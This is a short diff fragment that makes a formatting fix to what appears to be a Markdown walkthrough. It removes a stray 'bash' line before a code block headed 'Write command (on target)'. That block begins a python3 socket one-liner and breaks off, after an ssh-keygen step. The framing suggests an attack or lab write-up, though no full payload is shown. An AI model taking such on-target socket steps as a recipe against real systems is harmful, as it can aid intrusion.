@@ -710,8 +710,6 @@ ssh-keygen -t ed25519 -f archivist_key -N ""
 
 **Write command (on target):**
 
-bash
-
 ```bash
 python3 -c '
 import socket
